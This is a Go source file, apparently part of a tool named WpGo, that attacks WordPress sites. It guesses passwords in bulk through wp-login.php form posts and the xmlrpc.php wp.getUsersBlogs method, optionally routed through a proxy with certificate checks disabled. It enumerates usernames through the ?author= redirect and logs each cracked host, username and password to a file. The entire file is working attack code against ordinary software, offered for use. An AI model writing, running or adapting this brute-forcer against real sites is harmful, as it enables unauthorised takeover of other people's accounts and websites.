package module

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"

	"github.com/code-scan/Goal/Ghttp"
)

var Success = make(map[string]bool)
var BlackList = make(map[string]bool)
var sLock sync.Mutex
var bLock sync.Mutex
var Proxy string

type WpGo struct {
	http       Ghttp.Http
	AttackType string
}

func Write(line string) {
	lock.Lock()
	file, err := os.OpenFile(LogFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Println(err)
	} else {
		defer file.Close()
		file.WriteString(line)
	}
	lock.Unlock()
}
func NewWpGo(attackType string) *WpGo {
	w := WpGo{}
	w.AttackType = attackType
	w.http = *Ghttp.New()
	return &w
}
func (w *WpGo) Login(site SiteTask) {
	switch w.AttackType {
	case "login":
		w.FormLogin(site)
	case "xmlrpc":
		w.XMLRCPLogin(site)
	default:
		break
	}

}
func (w *WpGo) XMLRCPLogin(siteTask SiteTask) {
	if w.CheckIsBlack(siteTask) {
		return
	}
	log.Println(siteTask)
	uri := fmt.Sprintf("%s/xmlrpc.php", siteTask.Host)
	postData := fmt.Sprintf(`<methodCall>
	  <methodName>wp.getUsersBlogs</methodName>
	  <params>
		 <param><value>%s</value></param>
		 <param><value>%s</value></param>
	  </params>
	</methodCall>`, siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.SetPostString(postData)
	if Proxy != "" {
		w.http.SetProxy(Proxy)
	}
	if r := w.http.Execute(); r == nil {
		return
	}
	ret, _ := w.http.Text()
	if strings.Contains(ret, "isAdmin") {
		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
		w.SetSuccess(key)
		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
		log.Printf(line)
		Write(line)
	}
}
func (w *WpGo) FormLogin(siteTask SiteTask) {
	if w.CheckIsBlack(siteTask) {
		//log.Println("IsBlack ", siteTask)
		return
	}
	log.Println(siteTask)
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	if Proxy != "" {
		w.http.SetProxy(Proxy)
	}
	if r := w.http.Execute(); r == nil {
		return
	}
	defer w.http.Close()
	cookie := w.http.RespCookie()
	location := w.http.GetRespHead("location")
	if strings.Contains(cookie, "wordpress_logged_in") && w.http.StatusCode() == 302 && strings.Contains(location, "wp-admin") {
		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
		w.SetSuccess(key)
		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
		log.Printf(line)
		Write(line)
	}

}
func (w *WpGo) GetSuccess(key string) bool {
	sLock.Lock()
	r := Success[key]
	sLock.Unlock()
	return r
}
func (w *WpGo) SetSuccess(key string) {
	sLock.Lock()
	Success[key] = true
	sLock.Unlock()
	return
}
func (w *WpGo) GetBlack(key string) bool {
	sLock.Lock()
	r := BlackList[key]
	sLock.Unlock()
	return r
}
func (w *WpGo) SetBlack(key string, t bool) {
	sLock.Lock()
	BlackList[key] = t
	sLock.Unlock()
}
func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
	if w.GetBlack(siteTask.Host) {
		return true
	}
	key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
	if w.GetSuccess(key) {
		return true
	}
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	if Proxy != "" {
		w.http.SetProxy(Proxy)
	}
	w.http.Execute()
	defer w.http.Close()
	cookie := w.http.RespCookie()
	if strings.Contains(cookie, "wordpress_test_cookie") == false {
		w.SetBlack(siteTask.Host, true)
		return true
	}
	w.SetBlack(siteTask.Host, false)
	return false

}
func (w *WpGo) GetUser(host string, id int) string {
	uri := fmt.Sprintf("%s/?author=%d", host, id)
	w.http.New("GET", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	defer w.http.Close()
	if r := w.http.Execute(); r == nil {
		return ""
	}

	if w.http.StatusCode() != 301 && w.http.StatusCode() != 302 && w.http.StatusCode() != 200 {
		return ""
	}
	location := w.http.GetRespHead("location")
	//通过301获取用户名
	if location != "" {
		return w.getUser(location)
	}
	//通过页面返回获取用户名
	if text, err := w.http.Text(); err == nil {
		return w.getUser(text)
	}

	return ""
}
func (w *WpGo) getUser(userText string) string {
	if user := strings.Split(userText, "author/"); len(user) == 2 {
		if username := strings.Split(user[1], "/"); len(username) > 1 {
			//log.Println(username[0])
			return username[0]
		}
		return user[1]
	}
	return ""
}
